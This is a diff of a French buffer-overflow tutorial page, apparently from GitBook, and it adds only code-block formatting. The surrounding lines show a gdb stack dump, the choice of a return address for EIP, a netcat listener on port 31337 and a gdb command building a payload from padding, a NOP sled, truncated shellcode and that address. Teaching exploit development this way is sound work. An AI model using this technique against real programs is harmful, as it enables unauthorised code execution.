@@ -15,7 +15,8 @@ Cette adresse mémoire **ne doit pas contenir de bad characters** que nous avons
 (gdb) x/2000xb $esp+1400
 ```
 
-```
+{% code fullWidth="true" %}
+```nasm
 <SNIP>
 0xffffd5ec:  0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55
 0xffffd5f4:  0x55 0x55 0x55 0x55 0x55 0x55 0x90 0x90
@@ -36,6 +37,7 @@ Cette adresse mémoire **ne doit pas contenir de bad characters** que nous avons
                              # |---> Shellcode
 <SNIP>
 ```
+{% endcode %}
 
 Ici, nous devons maintenant choisir une adresse vers laquelle pointer l’EIP, et qui va exécuter les instructions **octet par octet à partir de cette adresse**.\
 Dans cet exemple, nous choisissons **l’adresse `0xffffd64c`**.
@@ -88,9 +90,11 @@ Listening on [0.0.0.0] (family 0, port 31337)
 
 On exécute à nouveau notre exploit avec le shellcode et l’adresse corrigée :
 
+{% code fullWidth="true" %}
 ```bash
 (gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
 ```
+{% endcode %}
 
 ***
 
